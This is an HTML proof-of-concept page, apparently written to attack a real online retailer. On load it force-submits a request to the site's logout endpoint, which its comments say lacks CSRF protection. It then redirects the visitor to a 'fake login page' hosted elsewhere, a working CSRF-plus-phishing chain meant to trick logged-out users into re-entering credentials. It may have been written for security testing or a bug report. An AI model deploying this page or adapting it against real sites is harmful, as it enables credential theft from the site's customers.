<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Logout and Redirect</title>
    <script>
        // Wait for the page to load, then submit the logout form
        window.onload = function() {
            // Create the logout form dynamically
            var form = document.createElement('form');
            form.method = 'GET';  // Use GET method, matching the target's logout endpoint
            form.action = 'https://www.boozt.com/logout';  // Replace with the correct logout URL of the target

            // Optionally, you can add a hidden CSRF token if the target uses one (but we know CSRF isn't being protected here)
            // var csrfToken = document.createElement('input');
            // csrfToken.type = 'hidden';
            // csrfToken.name = 'csrf_token';
            // csrfToken.value = 'your_token_here';
            // form.appendChild(csrfToken);

            // Submit the logout form
            document.body.appendChild(form);
            form.submit();

            // After logout is complete, redirect to your fake login page
            setTimeout(function() {
                window.location.href = "https://maxhunterr.github.io/csrf-test/index.html";  // Replace with the correct URL to your fake login page
            }, 1000);  // Delay to ensure the logout action is processed first
        };
    </script>
</head>
<body>
    <h1>Logging out...</h1>
    <p>You will be redirected shortly.</p>
</body>
</html>
